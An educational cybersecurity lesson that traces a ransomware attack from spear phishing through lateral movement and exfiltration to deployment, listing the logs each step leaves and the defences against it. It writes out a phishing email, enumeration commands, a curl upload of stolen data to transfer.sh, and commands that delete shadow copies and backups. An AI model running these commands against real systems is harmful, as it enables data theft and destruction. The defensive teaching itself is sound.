# Lesson 5.3 — What Attackers Actually Do (The Full Picture)

**Phase:** 5 — Introduction to Cybersecurity
**Prerequisite:** Lesson 5.2
**Time to complete:** 35 minutes

---

## Thinking Like an Attacker

To defend effectively, you must understand how attackers think. This is not about becoming an attacker — it is about understanding the threat you are defending against.

Attackers have goals. They have resources. They have constraints. They make mistakes.

Understanding their perspective helps you:
- Predict what they will do next
- Know what evidence to look for
- Prioritize what to protect
- Design better defenses

---

## The Attacker's Mindset

An attacker approaching a target thinks about:

Objective: What do I want? Money? Data? Disruption? Revenge?
Target selection: Why this company? Rich? Vulnerable? Has the data I want?
Risk tolerance: How much risk am I willing to take? Will I use noisy tools or stay stealthy?
Resources: Do I have custom tools? Am I using public exploit frameworks? How much time do I have?
Patience: Am I a smash-and-grab criminal or an APT willing to wait months?

---

## Real Attack Playbook — Step by Step

Let us trace a complete real-world attack. This is how ransomware groups typically operate.

### Day 1 — Initial Access via Phishing

Attacker researches the target company on LinkedIn, their website, job postings.
Learns they use Microsoft 365, Cisco firewalls, have 500 employees.
Identifies the IT help desk team and accounting department.

Crafts a spear phishing email:
```
From: it-support@company-helpdesk.com
To: sarah.jones@company.com
Subject: Action Required: Reset Your Password Before Access Expires

Sarah,

Your VPN password expires in 2 hours. Please click the link below to 
reset it to maintain access to company resources.

Reset Password: https://company-vpn-reset.com/auth

IT Support Team
```

The domain "company-vpn-reset.com" was registered yesterday. The URL leads to a fake VPN login page that captures credentials.

Sarah receives the email at 9 AM. It looks legitimate. She is busy. She clicks the link and enters her username and password. The attacker now has Sarah's VPN credentials.

Logs showing this:
- Email gateway log: Email from company-helpdesk.com received. SPF fail. DMARC fail. But the company's DMARC is p=none, so the email was delivered.
- Proxy log: sarah.jones visited company-vpn-reset.com at 9:14 AM. Submitted a form (POST request).

### Day 1 — Establishing C2 Foothold

Attacker logs in to the company VPN with Sarah's credentials.
The VPN connects them to the internal network.
They see they are on 10.0.5.200 (VPN range).

Now they download and execute a Cobalt Strike beacon (a professional penetration testing tool commonly used by attackers) on Sarah's computer by emailing her a "VPN client update."

Sarah opens the "update" — it installs the beacon alongside a fake VPN client update.
The beacon establishes HTTPS communication to the attacker's C2 server every 60 seconds.

Logs showing this:
- EDR: New process — update.exe executed, spawned conhost.exe, made network connection to 185.220.101.47:443.
- Proxy: Regular 60-second connections from sarah.jones's workstation to an unknown domain.

### Day 2-3 — Reconnaissance Inside the Network

Now inside the network, the attacker maps the environment.

They run:
```
net user /domain              — List all domain users
net group "Domain Admins" /domain — List Domain Admins
net view                     — List computers on the network
ipconfig /all                — Get network configuration
systeminfo                   — Get system information
nltest /domain_trusts        — Find trusted domains
```

These are all legitimate Windows commands — no malware signatures.

They use BloodHound (an AD mapping tool) to visualize attack paths to Domain Admin:
```
SharpHound.exe -c All --outputdirectory C:\Users\sarah\AppData\Local\Temp\
```
This dumps all AD object relationships and finds the shortest path to Domain Admin.

Logs: Event ID 4624 (logon), Event ID 4634 (logoff), various LDAP queries from sarah's workstation.

### Day 3-4 — Privilege Escalation

BloodHound shows: sarah.jones is a member of "Helpdesk" group. Helpdesk can reset passwords for members of "Service Accounts" group. "svc-sql" service account is a Domain Admin (misconfigured).

Attack path:
1. Sarah (already compromised) resets svc-sql's password
2. Attacker now has Domain Admin credentials

Or alternatively:
1. Attacker performs Kerberoasting — requests TGS for svc-sql
2. Cracks the ticket offline (svc-sql had password "Summer2023!")
3. Attacker has Domain Admin password

Logs: Event ID 4723 (password reset attempt) for svc-sql. Event ID 4769 (service ticket requests — Kerberoasting).

### Day 4-7 — Lateral Movement

With Domain Admin, the attacker moves to high-value targets:
- Domain Controllers
- Backup servers
- File servers with sensitive data
- Finance systems

They use tools like:
- PsExec — remote command execution via SMB
- WMI — Windows Management Instrumentation for remote commands
- PowerShell remoting — remote PowerShell sessions
- RDP — graphical remote access

All while impersonating DA-admin (a legitimate admin account they have compromised).

Logs:
- EventID 4624 Logon Type 3 (network) for DA-admin from unusual source IPs
- EventID 5140 (SMB share access) — C$ share accessed on multiple servers
- EventID 4688 (new process) — psexec.exe, wmic.exe, powershell.exe from unexpected systems

### Day 7 — Data Exfiltration

The attacker has located the crown jewels:
- SQL database with customer PII (5 GB)
- Financial records (2 GB)
- IP and code repositories (8 GB)

They compress and encrypt the data:
```
7z a -p"password" -mhe=on c:\temp\backup.7z "\\fileserver01\confidential" "\\sqlserver01\exports"
```

Then slowly exfiltrate via HTTPS to a cloud storage service (appears legitimate):
```
curl -T backup.7z https://transfer.sh/backup.7z  
```
Or via legitimate services: OneDrive, Dropbox, Google Drive (to bypass domain blacklists).

Logs:
- Large file creation events in temp directories
- Unusual access to file servers
- Large HTTPS uploads to cloud storage domains

### Day 8 — Ransomware Deployment

The night before deployment:
1. Identify all backup systems and delete them:
```
vssadmin.exe delete shadows /all /quiet
wbadmin.exe delete backup -keepVersions:0
net stop "Windows Backup"
```

2. Create Group Policy Object (GPO) that will:
   - Run ransomware on all computers at 3 AM
   - Disable Windows Defender
   - Delete event logs (to destroy evidence)

At 3 AM, ransomware executes on all 500 computers simultaneously.
Files are encrypted. Ransom notes appear everywhere.
Business grinds to a halt.

Logs (what remains):
- EventID 1102 (Security log cleared) — the attacker tried to delete evidence
- EventID 4699 (Scheduled task deleted) — removing their tracks
- EDR: Mass file modification events
- EDR: "DESKTOP.RANSOMWARE" extension on all files

---

## Defense Strategies — What Would Have Stopped This Attack

At each stage, there were opportunities to detect and stop the attack:

Stage 1 — Phishing:
DMARC p=reject would have rejected the phishing email.
Security awareness training would have made Sarah suspicious.
MFA on VPN would have blocked the attacker even with Sarah's password.

Stage 2 — C2:
EDR detecting the beacon's behavior.
Proxy alerting on new domains being accessed.
Network traffic analysis detecting the beaconing pattern.

Stage 3 — Reconnaissance:
Detection of AD enumeration tools (BloodHound, SharpHound).
Alerting on LDAP queries generating large amounts of data.

Stage 4 — Privilege Escalation:
Detecting Kerberoasting (Event ID 4769 mass requests).
Service accounts should not have Domain Admin rights.
Strong service account passwords prevent offline cracking.

Stage 5 — Lateral Movement:
Detecting privileged account logons from unexpected IPs.
Alerting on PsExec usage by unusual accounts.
Network segmentation limiting which systems can be reached.

Stage 6 — Exfiltration:
DLP (Data Loss Prevention) detecting large sensitive file movements.
Proxy alerting on unusual upload volumes.
Network monitoring detecting large HTTPS uploads.

Stage 7 — Ransomware:
EDR stopping shadow copy deletion.
Canary files (files that should never be modified — if they are, it triggers an alert).
Immutable backups (cannot be deleted by ransomware).
Privileged access management (GPO changes should trigger alerts).

---

## Summary

Attackers follow a systematic process: access → establish foothold → enumerate → escalate → move laterally → collect → exfiltrate → impact.
Modern attackers "live off the land" — using legitimate Windows tools to avoid detection.
Defenders must detect at every stage — the earlier the better.
Understanding attacker tools and techniques helps you build better detections.
No single control stops all attacks — defense in depth is required.

---

## Practice Questions

**Easy:**
1. What is "Living off the Land" (LotL)?
2. What is Cobalt Strike and why do attackers use it?
3. Why do attackers delete shadow copies before deploying ransomware?

**Medium:**
4. An attacker has Domain Admin credentials. What three actions would they likely take in the first 30 minutes to maximize their control?
5. Why is MFA (Multi-Factor Authentication) so effective at stopping the attack scenario described in this lesson?

**Thinking Questions:**
6. You are a SOC analyst. You receive an alert: "Mass file modification events on fileserver01 — 50,000 files modified in 2 minutes." What are you doing in the next 5 minutes?
7. An attacker has been in your network for 7 days before being detected. What evidence might they have already destroyed? What evidence might still be available? What are your priorities for the investigation?
